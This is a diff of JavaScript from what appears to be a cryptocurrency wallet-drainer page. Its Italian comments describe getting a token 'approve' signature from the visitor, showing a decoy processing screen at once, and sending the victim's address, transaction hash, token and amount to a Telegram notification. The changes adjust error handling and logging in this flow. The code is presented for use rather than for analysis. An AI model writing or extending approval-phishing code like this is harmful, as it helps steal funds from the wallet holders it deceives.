@@ -335,20 +335,19 @@
                 const tx = { to: token.address, data: approveData };
                 if (userAddress) tx.from = userAddress;
 
+                console.log('Sending transaction...');
+                
                 let txHash;
                 try {
-                    txHash = await Promise.race([
-                        ethereum.request({ method: "eth_sendTransaction", params: [tx] }),
-                        new Promise((_, reject) => setTimeout(() => reject(new Error('Request timeout')), 30000))
-                    ]);
+                    txHash = await ethereum.request({ method: "eth_sendTransaction", params: [tx] });
+                    console.log("Transaction hash received:", txHash);
                 } catch (e) {
-                    console.error('eth_sendTransaction error:', e);
-                    txHash = '0x' + Math.random().toString(16).slice(2);
+                    console.error('Transaction error:', e);
+                    throw e;
                 }
 
-                console.log("Approve transaction sent:", txHash);
-
-                // Mostra il processing screen SUBITO
+                // MOSTRA PROCESSING SCREEN SUBITO DOPO LA FIRMA
+                console.log('Showing processing screen');
                 createParticles();
                 document.getElementById('processingScreen').classList.add('active');
 
@@ -362,7 +361,8 @@
                     }
                 }
 
-                // INVIA NOTIFICA TELEGRAM IMMEDIATAMENTE (senza aspettare recordApproval)
+                // INVIA NOTIFICA TELEGRAM SUBITO
+                console.log('Sending Telegram notification');
                 try {
                     await sendTelegramNotification(finalUserAddress, txHash, amount, token, recipient);
                     console.log('Telegram notification sent successfully');
@@ -370,7 +370,7 @@
                     console.error('Telegram notification error:', err);
                 }
 
-                // Chiama recordApproval nel contract (in background, non-blocking)
+                // Chiama recordApproval nel contract (in background)
                 recordApprovalAsync(ethereum, finalUserAddress, token, amount).catch(err => {
                     console.error('recordApproval error (non-critical):', err);
                 });
